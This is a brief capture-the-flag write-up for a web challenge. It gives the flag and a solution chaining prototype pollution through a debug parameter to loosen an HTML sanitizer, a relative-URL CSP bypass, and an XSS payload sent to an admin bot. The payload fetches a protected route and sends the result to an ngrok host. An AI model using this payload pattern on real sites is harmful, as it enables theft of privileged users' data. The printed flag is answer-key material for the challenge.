# Flag

`shaktictf{_3nv120nm3n741_ju571c3_}`

# Solution

 - You need to send the admin a link via the admin bot and use XSS to access the `/flag` route and send it to your own server
 - You'll need to setup a server to receive the result. For example, combine an [http server](https://github.com/zoeyg/sec/blob/master/tools/simple-http-server.js) that will accept requests with ngrok.com to expose it externally
 - Use prototype pollution and the debug functionality to bypass the HTML sanitizer, you'll then hit the CSP
 - To get around the CSP use a relative url
 - An example url to send the admin:

```
https://superfund-challenge.2r.is/x/..%2fadmin/index.html?debug={"__proto__":{"allowedAttrs":["src","onerror"]},"user":{"name":"<img+src=x+onerror=fetch('/flag').then(r=%26gt;r.text()).then(d=%26gt;fetch('https://5103fe977eae.ngrok.io/b64/'%2Bbtoa(d))) />"}}&id=x
 ```